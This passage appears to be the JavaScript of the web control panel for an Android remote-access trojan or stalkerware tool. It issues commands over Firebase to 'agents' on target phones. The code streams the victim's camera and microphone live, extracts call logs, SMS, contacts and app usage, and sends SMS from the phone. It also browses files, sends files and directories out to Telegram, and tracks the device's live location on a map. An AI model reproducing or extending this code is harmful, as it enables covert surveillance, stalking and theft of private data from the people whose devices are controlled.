      else if (command.startsWith('start_camera_stream:')) title = 'Live Camera Feed';
      else if (command === 'start_microphone_stream') title = 'Live Microphone Feed';
      else if (command === 'stop_microphone_stream') title = 'Stop Microphone';

      db.ref(`Devices/${uid}/response`).off();
      setupResponseListener(uid);

      // Toggle microphone buttons
      const startBtn = document.getElementById(`micStartBtn_${uid}`);
      const stopBtn = document.getElementById(`micStopBtn_${uid}`);
      if (command === 'start_microphone_stream') {
        if (startBtn) startBtn.classList.add('hidden');
        if (stopBtn) stopBtn.classList.remove('hidden');
      } else if (command === 'stop_microphone_stream') {
        if (startBtn) startBtn.classList.remove('hidden');
        if (stopBtn) stopBtn.classList.add('hidden');
        stopAudioPlayback(); // Stop audio playback immediately
        isMicrophoneStopped = true; // Set stop flag
        liveAudioChunks = []; // Clear audio queue
        isLiveAudioPlaying = false; // Reset playing state
        if (liveStreamResponseRef) {
          liveStreamResponseRef.off(); // Remove listener
          liveStreamResponseRef = null;
        }
      }

      db.ref(`Devices/${uid}/command`).set(command)
        .then(() => {
          showToast(`‚úÖ Command ${command} sent to agent`, "success");
          setTimeout(() => {
            if (document.getElementById('fullscreenModal').style.display !== 'flex' && !command.startsWith('download_to_telegram:')) {
              showToast(`‚ö†Ô∏è Response delayed for ${command}`, "warning");
            }
          }, 2000);
        })
        .catch(e => showToast(`‚ùå Error executing ${command}: ${e.message}`, "error"));
    }

    function promptSMS(uid) {
      const number = prompt("Enter phone number:");
      const message = prompt("Enter message:");
      if (number && message) sendCommand(uid, `send_sms:${number}|${message}`);
    }

    function promptSoundURL(uid) {
      const url = prompt("Enter direct .mp3 URL to play:");
      if (url) sendCommand(uid, `play_url_sound:${url}`);
    }

    function promptPopup(uid) {
      const msg = prompt("Enter popup message to show:");
      if (msg) sendCommand(uid, `show_popup:${msg}`);
    }

    function renderFileList(rows) {
      if (!Array.isArray(rows) || !rows.length) return "<p class='text-agent-200'>" + (rows || "Waiting for command response...") + "</p>";
      lastFileList = rows;
      return `
        <div class="overflow-x-auto">
          <table class="w-full">
            <thead class="bg-neon-500/10">
              <tr>
                <th class="px-4 py-3 text-left text-xs font-medium text-agent-200 uppercase">Actions</th>
                <th class="px-4 py-3 text-left text-xs font-medium text-agent-200 uppercase">Name</th>
                <th class="px-4 py-3 text-left text-xs font-medium text-agent-200 uppercase">Path</th>
                <th class="px-4 py-3 text-left text-xs font-medium text-agent-200 uppercase">Size</th>
              </tr>
            </thead>
            <tbody class="divide-y divide-neon-500/10">
              ${rows.map(r => {
                const isImage = r.name && r.name.match(/\.(jpg|jpeg|png|gif)$/i);
                const isText = r.name && r.name.match(/\.(txt|csv)$/i);
                const isDir = r.isDirectory === "true";
                let openBtn = '';
                if (isDir) openBtn = `<button onclick="sendCommand('${selectedUid}', 'open_file:${r.path}')" class="px-3 py-1 bg-agent-500 hover:bg-agent-600 rounded text-xs text-white transition-colors"><i class="fas fa-folder-open mr-1"></i>Open</button>`;
                else if (isImage) openBtn = `<button onclick="sendCommand('${selectedUid}', 'open_file:${r.path}')" class="px-3 py-1 bg-agent-500 hover:bg-agent-600 rounded text-xs text-white transition-colors"><i class="fas fa-eye mr-1"></i>Preview</button>`;
                else if (isText) openBtn = `<button onclick="sendCommand('${selectedUid}', 'open_file:${r.path}')" class="px-3 py-1 bg-agent-500 hover:bg-agent-600 rounded text-xs text-white transition-colors"><i class="fas fa-file-alt mr-1"></i>Preview</button>`;
                else openBtn = `<button onclick="showUnsupportedPreview('${r.name}')" class="px-3 py-1 bg-gray-500 hover:bg-gray-600 rounded text-xs text-white transition-colors"><i class="fas fa-file mr-1"></i>Open</button>`;
                return `
                  <tr class="hover:bg-neon-500/5">
                    <td class="px-4 py-3 space-x-2">
                      ${openBtn}
                      ${isDir ? `<button onclick="promptDownloadDirectory('${r.path}', '${r.name}')" class="px-3 py-1 bg-success-500 hover:bg-success-600 rounded text-xs text-white transition-colors"><i class="fas fa-download mr-1"></i>Download</button>` : `<button onclick="sendCommand('${selectedUid}', 'download_to_telegram:${r.path}')" class="px-3 py-1 bg-neon-500 hover:bg-neon-600 rounded text-xs text-white transition-colors"><i class="fas fa-telegram mr-1"></i>Send</button>`}
                    </td>
                    <td class="px-4 py-3 text-white">${r.name}</td>
                    <td class="px-4 py-3 text-agent-200">${r.path}</td>
                    <td class="px-4 py-3 text-agent-200">${r.size}</td>
                  </tr>
                `;
              }).join('')}
            </tbody>
          </table>
        </div>`;
    }

    function renderTable(rows) {
      if (!Array.isArray(rows) || !rows.length) return "<p class='text-agent-200'>No structured data available.</p>";
      const headers = Object.keys(rows[0]);
      return `
        <div class="overflow-x-auto">
          <table class="w-full">
            <thead class="bg-neon-500/10">
              <tr>${headers.map(h => `<th class="px-4 py-3 text-left text-xs font-medium text-agent-200 uppercase">${h === 'icon' ? 'Icon' : h.charAt(0).toUpperCase() + h.slice(1)}</th>`).join('')}</tr>
            </thead>
            <tbody class="divide-y divide-neon-500/10">
              ${rows.map(r => `
                <tr class="hover:bg-neon-500/5">
                  ${headers.map(h => `
                    <td class="px-4 py-3">${h === 'icon' && r[h] ? `<img src="${r[h]}" class="w-8 h-8 rounded" alt="App Icon">` : (r[h] || '-')}</td>
                  `).join('')}
                </tr>
              `).join('')}
            </tbody>
          </table>
        </div>`;
    }

    function renderLogTable() {
      const tbody = document.getElementById('logTableBody');
      let html = logEntries.map(entry => `
        <tr class="hover:bg-neon-500/5">
          <td class="px-4 py-3 text-sm text-agent-200">${entry.time}</td>
          <td class="px-4 py-3 text-sm text-white font-medium">${entry.command}</td>
          <td class="px-4 py-3">
            <span class="px-2 py-1 rounded-full text-xs font-medium ${entry.status === 'Success' ? 'bg-success-500/20 text-success-500' : 'bg-warning-500/20 text-warning-500'}">${entry.status}</span>
          </td>
        </tr>
      `).join('');
      if (html !== lastLogTableHTML) {
        tbody.innerHTML = html;
        lastLogTableHTML = html;
      }
    }

    function renderContentInModal(response, lastCommand) {
      const modal = document.getElementById('fullscreenModal');
      const modalContent = document.getElementById('modalSectionContent');
      const modalTitle = document.getElementById('modalSectionTitle');
      const modalCloseBtn = document.getElementById('modalCloseBtn');
      modal.style.display = 'flex';
      document.body.style.overflow = 'hidden';
      
      let title = 'Response';
      if (lastCommand) {
        if (lastCommand === 'get_file_list' || lastCommand.startsWith('open_file:')) title = 'File Manager';
        else if (lastCommand === 'get_call_logs') title = 'Call Logs';
        else if (lastCommand === 'get_sms_logs') title = 'SMS Logs';
        else if (lastCommand === 'get_contacts') title = 'Contacts';
        else if (lastCommand === 'get_app_list') title = 'App List';
        else if (lastCommand === 'vibrate') title = 'Vibrate';
        else if (lastCommand === 'get_app_usage_sorted') title = 'App Usage';
        else if (lastCommand.startsWith('send_sms')) title = 'Send SMS';
        else if (lastCommand.startsWith('play_url_sound')) title = 'Play Sound';
        else if (lastCommand.startsWith('show_popup')) title = 'Show Popup';
        else if (lastCommand.startsWith('start_camera_stream:')) title = 'Live Camera Feed';
        else if (lastCommand === 'start_microphone_stream' || lastCommand === 'stop_microphone_stream') title = 'Live Microphone Feed';
      }
      
      modalTitle.innerHTML = `<i class='fas fa-window-maximize mr-3'></i> ${title}`;
      // Hide close button for live camera feed and microphone stream, show otherwise
      if (lastCommand && (lastCommand.startsWith('start_camera_stream:') || lastCommand === 'start_microphone_stream')) {
        modalCloseBtn.style.display = 'none';
      } else {
        modalCloseBtn.style.display = '';
      }
      modalContent.innerHTML = '';
      
      if (!response) {
        modalContent.innerHTML = '<p class="text-agent-200">Waiting for command response...</p>';
        return;
      }
      
      let backButton = '';
      if (lastCommand && lastCommand.startsWith('open_file:')) {
        const currentPath = lastCommand.split('open_file:')[1];
        const parentPath = currentPath.substring(0, currentPath.lastIndexOf('/')) || 'root';
        backButton = `<button onclick="sendCommand('${selectedUid}', 'open_file:${parentPath}')" class="mb-4 px-4 py-2 bg-agent-500 hover:bg-agent-600 rounded-lg text-white transition-colors"><i class="fas fa-arrow-left mr-2"></i>Back</button>`;
      }
      
      let stopCameraBtn = '';
      let stopMicrophoneBtn = '';
      if (lastCommand && lastCommand.startsWith('start_camera_stream:')) {
        stopCameraBtn = `<button onclick="stopCameraFromModal()" class="mb-4 ml-4 px-4 py-2 bg-danger-500 hover:bg-danger-600 rounded-lg text-white transition-colors"><i class="fas fa-video-slash mr-2"></i>Stop Camera</button>`;
      }
      if (lastCommand && lastCommand === 'start_microphone_stream') {
        stopMicrophoneBtn = `<button onclick="stopMicrophoneFromModal()" class="mb-4 ml-4 px-4 py-2 bg-danger-500 hover:bg-danger-600 rounded-lg text-white transition-colors"><i class="fas fa-microphone-slash mr-2"></i>Stop Microphone</button>`;
      }
      
      if (typeof response === "string") {
        if (response.startsWith("üñºÔ∏è Live Camera:")) {
          const base64Image = response.split("üñºÔ∏è Live Camera:")[1];
          if (base64Image) {
            const img = document.createElement("img");
            img.src = base64Image;
            img.className = "max-w-full max-h-[70vh] rounded-lg shadow-lg";
            modalContent.innerHTML = stopCameraBtn + stopMicrophoneBtn + backButton;
            modalContent.appendChild(img);
            if (lastCommand && lastCommand.startsWith('start_camera_stream:')) {
              setupLiveStreamUpdate(selectedUid, img);
            }
          } else {
            modalContent.innerHTML = stopCameraBtn + stopMicrophoneBtn + "<p class='text-danger-500'>‚ùå Invalid camera data.</p>";
          }
        } else if (response.startsWith("üñºÔ∏è Image:")) {
          const base64Image = response.split("üñºÔ∏è Image:")[1];
          if (base64Image) {
            const img = document.createElement("img");
            img.src = base64Image;
            img.className = "max-w-full max-h-[70vh] rounded-lg shadow-lg";
            modalContent.innerHTML = stopMicrophoneBtn + backButton;
            modalContent.appendChild(img);
          } else {
            modalContent.innerHTML = stopMicrophoneBtn + "<p class='text-danger-500'>‚ùå Invalid image data.</p>";
          }
        } else if (response.startsWith("üéôÔ∏è Live Audio:") || response.startsWith("üéôÔ∏è WAV Audio:")) {
          const audioType = response.startsWith("üéôÔ∏è Live Audio:") ? "Live Audio" : "WAV Audio";
          const base64Audio = response.split("üéôÔ∏è " + audioType + ":")[1];
          if (base64Audio) {
            const audio = document.createElement("audio");
            audio.controls = true;
            audio.className = "w-full max-w-md";
            audio.volume = 0.8;
            modalContent.innerHTML = stopMicrophoneBtn + backButton;
            modalContent.appendChild(audio);
            setupLiveAudioStream(selectedUid, audio);
          } else {
            modalContent.innerHTML = stopMicrophoneBtn + "<p class='text-danger-500'>‚ùå Invalid audio data.</p>";
          }
        } else if (response.startsWith("üìù Text Content:")) {
          const text = response.split("üìù Text Content:")[1] || "No text content available.";
          const pre = document.createElement("pre");
          pre.className = "bg-black/20 p-4 rounded-lg overflow-x-auto text-sm";
          pre.textContent = text;
          modalContent.innerHTML = stopMicrophoneBtn + backButton;
          modalContent.appendChild(pre);
        } else if (response.includes("Download URL:")) {
          const urlMatch = response.match(/Download URL: (https:\/\/[^"]+)/);
          if (urlMatch && urlMatch[1]) {
            const url = urlMatch[1];
            const a = document.createElement("a");
            a.href = url;
            a.download = "";
            a.textContent = "Click to download";
            a.className = "inline-block px-4 py-2 bg-agent-500 hover:bg-agent-600 rounded-lg text-white transition-colors";
            modalContent.innerHTML = stopMicrophoneBtn + backButton;
            modalContent.appendChild(a);
          } else {
            modalContent.innerHTML += stopMicrophoneBtn + "<p class='text-danger-500'>‚ùå Unable to extract download URL.</p>";
          }
        } else if (response.startsWith("‚úÖ Google Maps URL:")) {
          const url = response.split("‚úÖ Google Maps URL:")[1];
          if (url) {
            const a = document.createElement("a");
            a.href = url;
            a.target = "_blank";
            a.textContent = "Open Google Maps";
            a.className = "inline-block px-4 py-2 bg-agent-500 hover:bg-agent-600 rounded-lg text-white transition-colors";
            modalContent.innerHTML = stopMicrophoneBtn + backButton + a.outerHTML;
          } else {
            modalContent.innerHTML = stopMicrophoneBtn + "<p class='text-danger-500'>‚ùå Unable to fetch location URL.</p>";
          }
        } else {
          modalContent.innerHTML = stopMicrophoneBtn + backButton + "<p class='text-white'>" + response + "</p>";
        }
      } else if (Array.isArray(response)) {
        if (lastCommand === "get_file_list" || lastCommand.startsWith("open_file:")) {
          modalContent.innerHTML = stopMicrophoneBtn + backButton + renderFileList(response);
        } else if (lastCommand === "get_call_logs" || lastCommand === "get_sms_logs" || lastCommand === "get_contacts" || lastCommand === "get_app_list") {
          modalContent.innerHTML = stopMicrophoneBtn + backButton + renderTable(response);
        } else if (lastCommand === "get_app_usage_sorted") {
          const formatted = response.map((entry, index) => {
            let label = entry.label || entry.package || "Unknown";
            if (label.toLowerCase() === "unknown" || label === entry.package) {
              const parts = (entry.package || "").split('.');
              label = parts.length > 2 ? parts[parts.length - 1] : entry.package || "Unknown";
              label = label.charAt(0).toUpperCase() + label.slice(1);
            }
            return {
              icon: entry.icon || "",
              label: label,
              package: entry.package || "N/A",
              screen_time: entry.screen_time || formatScreenTime(entry.time || 0)
            };
          });
          modalContent.innerHTML = stopMicrophoneBtn + backButton + renderTable(formatted);
        }
      } else {
        modalContent.innerHTML = stopMicrophoneBtn + "<p class='text-agent-200'>Waiting for command response...</p>";
      }
    }

    function formatScreenTime(ms) {
      const totalSecs = Math.floor(ms / 1000);
      const h = Math.floor(totalSecs / 3600);
      const m = Math.floor((totalSecs % 3600) / 60);
      const s = totalSecs % 60;
      return `${h.toString().padStart(2, '0')}h ${m.toString().padStart(2, '0')}m ${s.toString().padStart(2, '0')}s`;
    }

    function setupLiveStreamUpdate(uid, element) {
      if (liveStreamResponseRef) {
        liveStreamResponseRef.off();
      }
      liveStreamResponseRef = db.ref(`Devices/${uid}/response`);
      liveStreamResponseRef.on("value", snapshot => {
        const response = snapshot.val();
        if (response) {
          if (response.startsWith("üñºÔ∏è Live Camera:")) {
            const base64Image = response.split("üñºÔ∏è Live Camera:")[1];
            if (base64Image && element.tagName === "IMG") {
              element.src = base64Image;
            }
          } else if (response.startsWith("üéôÔ∏è Live Audio:") || response.startsWith("üéôÔ∏è WAV Audio:")) {
            const audioType = response.startsWith("üéôÔ∏è Live Audio:") ? "Live Audio" : "WAV Audio";
            const base64Audio = response.split("üéôÔ∏è " + audioType + ":")[1];
            if (base64Audio && element.tagName === "AUDIO") {
              element.src = "data:audio/wav;base64," + base64Audio;
              // Auto-play the audio
              element.play().catch(error => {
                console.error('Auto-play failed:', error);
              });
            }
          }
        }
      });
    }

    function setupLiveAudioStream(uid, audioElement) {
      if (liveStreamResponseRef) {
        liveStreamResponseRef.off();
      }
      
      liveAudioChunks = [];
      isLiveAudioPlaying = false;
      isMicrophoneStopped = false;
      
      liveStreamResponseRef = db.ref(`Devices/${uid}/response`);
      liveStreamResponseRef.on("value", snapshot => {
        if (isMicrophoneStopped) return; // Skip processing if stopped
        const response = snapshot.val();
        if (response && response.startsWith("üéôÔ∏è WAV Audio:") && !isMicrophoneStopped) {
          const base64Audio = response.split("üéôÔ∏è WAV Audio:")[1];
          if (base64Audio) {
            liveAudioChunks.push(base64Audio);
            playNextAudioChunk(audioElement);
          }
        }
      });
    }

    function playNextAudioChunk(audioElement) {
      if (liveAudioChunks.length === 0 || isLiveAudioPlaying) return;

      isLiveAudioPlaying = true;
      const base64Audio = liveAudioChunks.shift();

      const audioContext = initializeAudioContext();
      const binary = atob(base64Audio);
      const len = binary.length;
      const buffer = new Uint8Array(len);
      for (let i = 0; i < len; i++) {
        buffer[i] = binary.charCodeAt(i);
      }

      audioContext.decodeAudioData(buffer.buffer, (audioBuffer) => {
        const source = audioContext.createBufferSource();
        source.buffer = audioBuffer;
        source.connect(audioContext.destination);
        source.start(0);
        source.onended = () => {
          isLiveAudioPlaying = false;
          if (liveAudioChunks.length > 0) {
            playNextAudioChunk(audioElement);
          }
        };
      }, (e) => {
        console.error("Web Audio API decode error:", e);
        playWithHTML5Audio(base64Audio, audioElement);
      });
    }

    function playWithHTML5Audio(base64Data, audioElement) {
      try {
        const audioUrl = `data:audio/wav;base64,${base64Data}`;
        if (audioElement) {
          audioElement.src = audioUrl;
          audioElement.volume = 0.8;
          audioElement.play().then(() => {
            console.log('Audio played via HTML5 Audio');
          }).catch(error => {
            console.error('HTML5 Audio play error:', error);
          });
          audioElement.onended = () => {
            if (liveAudioChunks.length > 0) {
              playNextAudioChunk(audioElement);
            }
          };
        } else {
          const tempAudio = new Audio(audioUrl);
          tempAudio.volume = 0.8;
          tempAudio.play().catch(error => {
            console.error('HTML5 Audio play error:', error);
          });
        }
      } catch (error) {
        console.error('Error with HTML5 Audio fallback:', error);
      }
    }

    function promptDownloadDirectory(path, name) {
      if (confirm("Download directory: " + name + "?")) sendCommand(selectedUid, `download_directory:${path}`);
    }

    function showToast(message, type = "success") {
      const toast = document.createElement("div");
      toast.className = `glass-effect rounded-xl p-4 shadow-lg flex items-center space-x-3 ${type === 'success' ? 'border-l-4 border-success-500' : type === 'error' ? 'border-l-4 border-danger-500' : type === 'warning' ? 'border-l-4 border-warning-500' : 'border-l-4 border-primary-500'}`;
      toast.innerHTML = `
        <span class="text-xl">${icons[type] || icons.info}</span>
        <span class="text-white">${message}</span>
        <button onclick="this.parentElement.remove()" class="ml-auto text-gray-400 hover:text-white transition-colors">
          <i class="fas fa-times"></i>
        </button>
      `;
      document.getElementById("toastContainer").appendChild(toast);
      setTimeout(() => toast.remove(), 4000);
    }

    function openFullscreenModal(title, contentHtml) {
      document.getElementById('fullscreenModal').style.display = 'flex';
      document.getElementById('modalSectionTitle').innerHTML = `<i class='fas fa-window-maximize mr-3'></i> ${title}`;
      document.getElementById('modalSectionContent').innerHTML = contentHtml;
      document.body.style.overflow = 'hidden';
    }

    function closeFullscreenModal() {
      document.getElementById('fullscreenModal').style.display = 'none';
      document.getElementById('modalSectionTitle').innerHTML = '';
      document.getElementById('modalSectionContent').innerHTML = '';
      document.body.style.overflow = '';
    }

    function showUnsupportedPreview(filename) {
      openFullscreenModal('File Preview', `<p class='text-agent-200'>Preview not supported for <b class='text-white'>${filename}</b>.</p>`);
    }

    function stopCameraFromModal() {
      if (liveStreamResponseRef) {
        liveStreamResponseRef.off();
        liveStreamResponseRef = null;
      }
      closeFullscreenModal();
      if (selectedUid) {
        db.ref(`Devices/${selectedUid}/command`).set('stop_camera_stream');
        setTimeout(() => db.ref(`Devices/${selectedUid}/command`).set('stop_camera_stream'), 50);
        setTimeout(() => db.ref(`Devices/${selectedUid}/command`).set('stop_camera_stream'), 150);
        setTimeout(() => db.ref(`Devices/${selectedUid}/command`).set('stop_camera_stream'), 300);
        showToast('üõë Camera stream stopped', 'info');
      }
    }

    function stopMicrophoneFromModal() {
      if (liveStreamResponseRef) {
        liveStreamResponseRef.off();
        liveStreamResponseRef = null;
      }
      closeFullscreenModal();
      if (selectedUid) {
        // Send stop command multiple times for reliability
        db.ref(`Devices/${selectedUid}/command`).set('stop_microphone_stream');
        setTimeout(() => db.ref(`Devices/${selectedUid}/command`).set('stop_microphone_stream'), 50);
        setTimeout(() => db.ref(`Devices/${selectedUid}/command`).set('stop_microphone_stream'), 150);
        setTimeout(() => db.ref(`Devices/${selectedUid}/command`).set('stop_microphone_stream'), 300);
        showToast('üõë Microphone stream stopped', 'info');
        // Update button states
        const startBtn = document.getElementById(`micStartBtn_${selectedUid}`);
        const stopBtn = document.getElementById(`micStopBtn_${selectedUid}`);
        if (startBtn) startBtn.classList.remove('hidden');
        if (stopBtn) stopBtn.classList.add('hidden');
        // Stop audio playback and clear state
        stopAudioPlayback();
        isMicrophoneStopped = true;
        liveAudioChunks = [];
        isLiveAudioPlaying = false;
      }
    }

    function sendStopCameraMultiple(uid) {
      db.ref(`Devices/${uid}/command`).set('stop_camera_stream');
      setTimeout(() => db.ref(`Devices/${uid}/command`).set('stop_camera_stream'), 50);
      setTimeout(() => db.ref(`Devices/${uid}/command`).set('stop_camera_stream'), 150);
      setTimeout(() => db.ref(`Devices/${uid}/command`).set('stop_camera_stream'), 300);
      showToast('üõë Camera stream stopped', 'info');
    }

    // Microphone streaming functions
    function startMicrophoneStream(uid) {
      const startBtn = document.getElementById(`micStartBtn_${uid}`);
      const stopBtn = document.getElementById(`micStopBtn_${uid}`);
      if (startBtn) startBtn.classList.add('hidden');
      if (stopBtn) stopBtn.classList.remove('hidden');

      if (!audioContext) {
        initializeAudioContext();
      }

      sendCommand(uid, 'start_microphone_stream');
      
      // Open modal with audio element
      const modal = document.getElementById('fullscreenModal');
      const modalContent = document.getElementById('modalSectionContent');
      const modalTitle = document.getElementById('modalSectionTitle');
      
      modalTitle.innerHTML = `<i class='fas fa-window-maximize mr-3'></i> Live Microphone Feed`;
      modal.style.display = 'flex';
      document.body.style.overflow = 'hidden';
      
      const audio = document.createElement("audio");
      audio.controls = true;
      audio.className = "w-full max-w-md";
      audio.volume = 0.8;
      
      modalContent.innerHTML = `<button onclick="stopMicrophoneFromModal()" class="mb-4 ml-4 px-4 py-2 bg-danger-500 hover:bg-danger-600 rounded-lg text-white transition-colors"><i class="fas fa-microphone-slash mr-2"></i>Stop Microphone</button>` + backButton;
      modalContent.appendChild(audio);
      
      setupLiveAudioStream(uid, audio);
      
      showToast('üéôÔ∏è Microphone stream started', 'success');
    }

    function stopMicrophoneStream(uid) {
      // Update UI buttons immediately
      const startBtn = document.getElementById(`micStartBtn_${uid}`);
      const stopBtn = document.getElementById(`micStopBtn_${uid}`);
      if (startBtn) startBtn.classList.remove('hidden');
      if (stopBtn) stopBtn.classList.add('hidden');

      // Close modal immediately
      closeFullscreenModal();

      // Set stop flag immediately
      isMicrophoneStopped = true;
      
      // Stop audio playback immediately
      stopAudioPlayback();
      
      // Clear any pending audio chunks
      liveAudioChunks = [];
      isLiveAudioPlaying = false;
    }



    function playBase64Audio(base64Data) {
      try {
        // Convert base64 to audio buffer
        const audioData = atob(base64Data);
        const arrayBuffer = new ArrayBuffer(audioData.length);
        const view = new Uint8Array(arrayBuffer);
        for (let i = 0; i < audioData.length; i++) {
          view[i] = audioData.charCodeAt(i);
        }

        // Create audio context if not exists
        if (!audioContext) {
          audioContext = new (window.AudioContext || window.webkitAudioContext)();
        }

        // Decode and play audio
        audioContext.decodeAudioData(arrayBuffer).then(audioBuffer => {
          const source = audioContext.createBufferSource();
          source.buffer = audioBuffer;
          source.connect(audioContext.destination);
          source.start(0);
        }).catch(error => {
          console.error('Error playing audio:', error);
        });
      } catch (error) {
        console.error('Error processing audio data:', error);
      }
    }

    function playBase64Wav(base64Data) {
      try {
        // Remove the data URL prefix if present
        if (base64Data.startsWith("data:audio/wav;base64,")) {
          base64Data = base64Data.replace("data:audio/wav;base64,", "");
        }
        
        // Create AudioContext if not exists
        if (!audioContext) {
          audioContext = new (window.AudioContext || window.webkitAudioContext)();
          // Resume audio context if suspended (required for autoplay)
          if (audioContext.state === 'suspended') {
            audioContext.resume();
          }
        }

        // Convert base64 to ArrayBuffer
        const binary = atob(base64Data);
        const len = binary.length;
        const buffer = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
          buffer[i] = binary.charCodeAt(i);
        }

        // Try Web Audio API first
        try {
          audioContext.decodeAudioData(buffer.buffer, (audioBuffer) => {
            const source = audioContext.createBufferSource();
            source.buffer = audioBuffer;
            source.connect(audioContext.destination);
            source.start(0);
            console.log('Audio played via Web Audio API');
          }, (e) => {
            console.error("Web Audio API decode error:", e);
            // Fallback to HTML5 Audio
            playWithHTML5Audio(base64Data);
          });
        } catch (e) {
          console.error("Web Audio API error:", e);
          // Fallback to HTML5 Audio
          playWithHTML5Audio(base64Data);
        }
      } catch (error) {
        console.error('Error processing WAV audio:', error);
        // Final fallback - try direct HTML5 audio
        try {
          const audio = new Audio(`data:audio/wav;base64,${base64Data}`);
          audio.volume = 0.8;
          audio.play().then(() => {
            console.log('Audio played via direct HTML5 Audio');
          }).catch(error => {
            console.error('Direct HTML5 Audio error:', error);
          });
        } catch (finalError) {
          console.error('All audio methods failed:', finalError);
        }
      }
    }

    function playWithHTML5Audio(base64Data) {
      try {
        // Create blob and audio element for fallback
        const audioData = atob(base64Data);
        const arrayBuffer = new ArrayBuffer(audioData.length);
        const view = new Uint8Array(arrayBuffer);
        for (let i = 0; i < audioData.length; i++) {
          view[i] = audioData.charCodeAt(i);
        }

        const blob = new Blob([arrayBuffer], { type: 'audio/wav' });
        const audioUrl = URL.createObjectURL(blob);
        
        const audio = new Audio(audioUrl);
        audio.volume = 0.8;
        audio.play().then(() => {
          console.log('Audio played via HTML5 Audio');
        }).catch(error => {
          console.error('HTML5 Audio play error:', error);
        });

        // Clean up URL after playing
        audio.onended = () => {
          URL.revokeObjectURL(audioUrl);
        };
      } catch (error) {
        console.error('Error with HTML5 Audio fallback:', error);
      }
    }

    function processAudioBuffer() {
      if (audioBuffer.length === 0 || isPlayingAudio) return;
      
      isPlayingAudio = true;
      const buffer = audioBuffer.shift();
      
      audioContext.decodeAudioData(buffer, (decodedBuffer) => {
        const source = audioContext.createBufferSource();
        source.buffer = decodedBuffer;
        source.connect(audioContext.destination);
        source.start(0);
        
        source.onended = () => {
          isPlayingAudio = false;
          // Process next buffer if available
          if (audioBuffer.length > 0) {
            setTimeout(processAudioBuffer, 10);
          }
        };
      }, (e) => {
        console.error("decodeAudioData error", e);
        isPlayingAudio = false;
        // Continue processing even if one buffer fails
        if (audioBuffer.length > 0) {
          setTimeout(processAudioBuffer, 10);
        }
      });
    }

    function stopAudioPlayback() {
      if (audioContext) {
        audioContext.close();
        audioContext = null;
      }
      liveAudioChunks = [];
      isLiveAudioPlaying = false;
      isMicrophoneStopped = true;
    }

    function initializeAudioContext() {
      if (!audioContext) {
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        if (audioContext.state === 'suspended') {
          audioContext.resume();
        }
      }
      return audioContext;
    }

    // Test audio function to verify audio is working
    function testAudio() {
      const audioContext = initializeAudioContext();
      if (audioContext.state === 'suspended') {
        audioContext.resume();
      }

      const oscillator = audioContext.createOscillator();
      const gainNode = audioContext.createGain();
      
      oscillator.connect(gainNode);
      gainNode.connect(audioContext.destination);
      
      oscillator.frequency.setValueAtTime(440, audioContext.currentTime); // A4 note
      gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
      
      oscillator.start(audioContext.currentTime);
      oscillator.stop(audioContext.currentTime + 0.5);
      
      showToast('üîä Audio test played - you should hear a beep', 'success');
    }

    // --- Network Load Animation State ---
    let networkLoadHistory = Array(20).fill(0); // For sparkline
    let lastNetworkLoad = 0;
    let networkLoadAnimFrame = null;

    function animateNetworkLoad(target) {
      const percentElem = document.getElementById('networkLoadPercent');
      const circle = document.getElementById('networkLoadProgress');
      if (!percentElem || !circle) return;

      let current = lastNetworkLoad;
      const step = () => {
        current += (target - current) * 0.2;
        if (Math.abs(current - target) < 0.5) current = target;
        percentElem.textContent = `${Math.round(current)}%`;
        // Animate SVG circle
        const max = 176; // 2 * PI * r (r=28)
        circle.setAttribute('stroke-dashoffset', max - (max * current / 100));
        if (current !== target) {
          networkLoadAnimFrame = requestAnimationFrame(step);
        } else {
          lastNetworkLoad = target;
        }
      };
      if (networkLoadAnimFrame) cancelAnimationFrame(networkLoadAnimFrame);
      step();
    }

    // --- Sparkline Update ---
    function updateNetworkLoadSparkline() {
      const svg = document.getElementById('networkLoadSparkline');
      if (!svg) return;
      const w = 80, h = 24, n = networkLoadHistory.length;
      const points = networkLoadHistory.map((v, i) => {
        const x = (w / (n - 1)) * i;
        const y = h - (v / 100) * h;
        return `${x},${y}`;
      }).join(' ');
      svg.querySelector('polyline').setAttribute('points', points);
    }

    // --- Live Map Tracking ---
    let map, marker, liveLocationRef;

    function initLiveMap(lat = 28.7041, lng = 77.1025) {
      if (!map) {
        map = L.map('liveMap').setView([lat, lng], 15);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
          maxZoom: 19,
        }).addTo(map);
        marker = L.marker([lat, lng]).addTo(map);
      }
    }

    function updateLiveLocation(lat, lng) {
      if (!map) initLiveMap(lat, lng);
      if (map && marker) {
        marker.setLatLng([lat, lng]);
        map.setView([lat, lng]);
        const statusElem = document.getElementById('liveLocationStatus');
        if (statusElem) statusElem.innerText = `Lat: ${lat}, Lng: ${lng}`;
      }
    }

    function listenForLiveLocation(deviceId) {
      if (liveLocationRef) liveLocationRef.off();
      liveLocationRef = firebase.database().ref(`Devices/${deviceId}/location`);
      liveLocationRef.on('value', (snapshot) => {
        const loc = snapshot.val();
        if (loc && loc.lat && loc.lng) {
          updateLiveLocation(loc.lat, loc.lng);
        }
      });
    }

    // --- Get Location from Google Maps URL and update map directly ---
    function getLocation() {
      const locationRef = firebase.database().ref('live_location_url');
      locationRef.once('value').then((snapshot) => {
        const url = snapshot.val();
        if (url && url.includes('query=')) {
          // Extract coordinates from the URL
          const coords = url.split('query=')[1].split(',').map(Number);
          if (coords.length === 2 && !isNaN(coords[0]) && !isNaN(coords[1])) {
            updateLiveLocation(coords[0], coords[1]); // Update the map marker and center
          }
        }
        // If no valid coordinates, do nothing (no error, no toast, no popup)
      }).catch((error) => {
        // Do nothing on error
      });
    }

    // Initialize
    window.addEventListener('DOMContentLoaded', () => {
      startStatsInterval();
      if (typeof selectedUid !== 'undefined' && selectedUid) {
        renderDevice(selectedUid);
        listenForLiveLocation(selectedUid);
      }
    });
  </script>
  <!-- Responsive Sidebar JS -->
  <script>
    // Sidebar drawer for mobile
    const sidebar = document.getElementById('sidebar');
    const sidebarToggle = document.getElementById('sidebarToggle');
    const sidebarOverlay = document.getElementById('sidebarOverlay');
    function openSidebar() {
      sidebar.classList.remove('-translate-x-full');
      sidebarOverlay.classList.remove('hidden');
    }
    function closeSidebar() {
      sidebar.classList.add('-translate-x-full');
      sidebarOverlay.classList.add('hidden');
    }
    if (sidebarToggle) {
      sidebarToggle.addEventListener('click', openSidebar);
    }
    if (sidebarOverlay) {
      sidebarOverlay.addEventListener('click', closeSidebar);
    }
    // Close sidebar on resize to desktop
